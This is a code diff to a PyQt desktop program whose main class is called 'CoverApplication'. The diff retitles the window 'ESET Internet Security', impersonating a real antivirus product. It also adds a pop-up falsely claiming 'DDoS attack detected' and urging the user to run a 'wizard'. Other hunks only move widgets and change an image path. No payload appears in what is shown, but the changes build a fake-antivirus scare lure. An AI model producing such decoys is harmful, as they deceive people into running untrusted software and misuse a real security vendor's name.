@@ -23,20 +23,30 @@ class CoverApplication(QMainWindow):
         #proggres bar
         self.pbar = QProgressBar(self)
         self.pbar.setGeometry(30, 40, 700, 30)
-        self.pbar.move(175, 400)
+        self.pbar.move(175, 420)
 
         #button
         self.btn = QPushButton('Start', self)
         self.btn.setGeometry(100, 100, 100, 30)
-        self.btn.move(450, 450)
+        self.btn.move(450, 460)
         self.btn.clicked.connect(self.doAction)
 
         self.timer = QBasicTimer()
         self.step = 0
 
         self.setGeometry(100, 100, 1000, 500)
-        self.setWindowTitle('DDoS Attack Remove')
+        self.setWindowTitle('ESET Internet Security')
         self.show()
+
+        popupWarning = QWidget()
+        popupWarning.setWindowTitle('Warning')
+        popupWarning.setGeometry(100, 100, 100, 10)
+
+        popupWarning.buttonReply = QMessageBox.information(self, 'WARNING!', "DDoS attack detected. Run the wizard to remove it.", QMessageBox.Ok)
+        if popupWarning.buttonReply == QMessageBox.Ok:
+            popupWarning.hide()
+            return
+        popupWarning.show()
 
     def timerEvent(self, e):
         if self.step >= 100:
@@ -88,7 +98,7 @@ class CoverApplication(QMainWindow):
             self.btn.setText('Stop')
             
     def setBackground(self):
-        background = QImage('assets/background.jpg')
+        background = QImage('assets/background.png')
         background = background.scaled(1000, 500)
         pallete = QPalette()
         pallete.setBrush(QPalette.Window, QBrush(background))
